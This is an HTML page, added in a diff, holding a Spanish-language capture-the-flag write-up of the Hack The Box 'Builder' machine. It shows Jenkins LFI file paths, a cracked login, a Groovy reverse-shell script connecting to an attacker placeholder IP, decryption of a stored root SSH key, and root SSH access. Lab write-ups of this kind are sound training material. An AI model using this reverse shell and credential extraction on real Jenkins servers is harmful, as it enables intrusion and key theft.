@@ -1,0 +1,110 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Builder HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/builder/pasted-20260404120013.png" alt="Builder HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>Builder</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>jenkins</span>
+            <span>lfi</span>
+            <span>id_rsa</span>
+            <span>groovy</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Jenkins 2.441 expuesto en la web</li>
+            <li><code>Explotación</code>: LFI en Jenkins para leer usuarios y hashes de configuración</li>
+            <li><code>Movimiento lateral</code>: Acceso a Jenkins/Groovy y lectura de credenciales cifradas del contenedor</li>
+            <li><code>Escalada de Privilegios</code>: Descifrado de clave privada y acceso SSH como root</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/builder/pasted-20260404120223.png" alt="Builder HTB" />
+          <img class="writeup-image" src="/writeups/assets/builder/pasted-20260404122201.png" alt="Builder HTB" />
+          <img class="writeup-image" src="/writeups/assets/builder/pasted-20260404122229.png" alt="Builder HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: LFI</h2>
+          <img class="writeup-image" src="/writeups/assets/builder/pasted-20260405233525.png" alt="Builder HTB" />
+          <div class="code-card">
+            <h3>Ruta configuración de usuarios</h3>
+            <pre><code>/var/jenkins_home/users/users.xml</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/builder/pasted-20260405233713.png" alt="Builder HTB" />
+          <div class="code-card">
+            <h3>Ruta configuración del usuario jennifer</h3>
+            <pre><code>/var/jenkins_home/users/jennifer_12108429903186576833/config.xml</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/builder/pasted-20260405233826.png" alt="Builder HTB" />
+          <div class="code-card">
+            <h3>Ver tipo de Hash</h3>
+            <pre><code>hashid '$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a'</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/builder/pasted-20260405234125.png" alt="Builder HTB" />
+          <img class="writeup-image" src="/writeups/assets/builder/pasted-20260405234445.png" alt="Builder HTB" />
+          <div class="code-card">
+            <h3>Acceso a la web</h3>
+            <pre><code># Credenciales -&gt; jennifer:princess</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/builder/pasted-20260405234849.png" alt="Builder HTB" />
+          <div class="code-card">
+            <h3>Accedemos desde la consola Groovy a un contenedor</h3>
+            <pre><code>String host="&lt;kali_ip&gt;";
+int port=443;
+String cmd="/bin/bash";
+
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/builder/pasted-20260406000948.png" alt="Builder HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios</h2>
+          <div class="code-card">
+            <h3>Leer credential.xml</h3>
+            <pre><code># Private Key</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/builder/pasted-20260406001300.png" alt="Builder HTB" />
+          <div class="code-card">
+            <h3>Consola de Groovy extraemos clave privada de root</h3>
+            <pre><code>println(hudson.util.Secret.decrypt("{AQAAABAAAAow...MaKSM=}"))</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/builder/pasted-20260406002210.png" alt="Builder HTB" />
+          <div class="code-card">
+            <h3>Conexión SSH con id_rsa</h3>
+            <pre><code># Crear fichero id_rsa y pegar la clave privada
+chmod 600 id_rsa
+ssh -i id_rsa root@10.129.230.220</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/builder/pasted-20260406002655.png" alt="Builder HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>jenkins</span>
+            <span>lfi</span>
+            <span>id_rsa</span>
+            <span>groovy</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
